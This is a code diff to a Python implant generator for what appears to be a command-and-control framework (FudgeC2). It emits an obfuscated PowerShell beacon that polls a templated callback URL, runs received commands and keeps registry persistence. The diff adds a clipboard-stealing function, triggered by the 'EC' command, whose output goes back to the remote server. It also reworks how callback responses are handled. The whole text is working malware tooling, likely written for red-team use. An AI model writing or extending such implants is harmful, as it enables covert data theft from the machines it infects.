@@ -22,7 +22,8 @@ class ImplantGenerator:
                            "obf_builtin_command": "execute-command",
                            "obf_reg_key_name": "FudgeC2Persistence",
                            "obf_callback_url":"url",
-                           "obf_callback_reason":"callback_reason"
+                           "obf_callback_reason":"callback_reason",
+                           "obf_get_clipboard":"export-clipboard"
                            }
 
     # -- This is to be finished with PoC WorkWork audio
@@ -31,9 +32,15 @@ function {{ ron.obf_remote_play_audio }}($data) {
     $args[0]
 }
 '''
-    # -- EMPTY TO FILL
+    # This is an early iteration for testing - this will be
+    #   expanded to support image/audio/file list export.
     fde_func_a = '''
-function aaaaaa() {}
+function {{ ron.obf_get_clipboard }}() {
+    $b = "Text"
+    $a = Get-Clipboard -Format $b
+    if ($a -ne $null ){$Script:tr = $a}
+    else {$Script:tr = "No clipboard data"}
+}
 '''
 
     # -- KEEP
@@ -83,6 +90,8 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_create_persistence }}
     } elseif ($a -eq "PS"){
         {{ ron.obf_remote_play_audio }}($b)
+    } elseif ($a -eq "EC"){
+        {{ ron.obf_get_clipboard }} 
     } else {
         $Script:tr = "0"
     }
@@ -116,7 +125,7 @@ function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
     $reqstream = $resp.GetResponseStream()
     $sr = new-object System.IO.StreamReader $reqstream
     $result  = $sr.ReadtoEnd()
-    return $result
+    $Script:headers = $result
 }    
 
 '''
@@ -148,7 +157,7 @@ function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
     $reqstream = $resp.GetResponseStream()
     $sr = new-object System.IO.StreamReader $reqstream
     $result  = $sr.ReadtoEnd()
-    return $result
+    $Script:headers = $result
 }    
 '''
 
@@ -170,6 +179,7 @@ ${{ ron.obf_sleep }}={{ beacon }}
 ${{ ron.obf_callback_url }} = "{{ url }}"
 while($true){
     $plh=0
+    $headers = $null
     try {
             {{ proto_core }}
     } catch {
@@ -177,9 +187,10 @@ while($true){
     }
     if ( $headers -NotLike "=="){
         {{ ron.obf_builtin_command }}($headers)
-        $atr = $tr -join "`n"
-        $plh = $atr
-        if ($Script:tr -ne "0"){ 
+        
+        if ($tr -ne "0"){ 
+            $atr = $tr -join "`n"
+            $plh = $atr
             try {
                     {{ proto_core }}
             } catch {
@@ -242,7 +253,7 @@ while($true){
 
         for x in proto_list.keys():
             if implant_data[x] is not 0:
-                protocol_string = protocol_string + "    " + str(proto_count) + " { $headers = " + proto_list[x] + "($plh) }\n"
+                protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
                 proto_count += 1
 
         f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
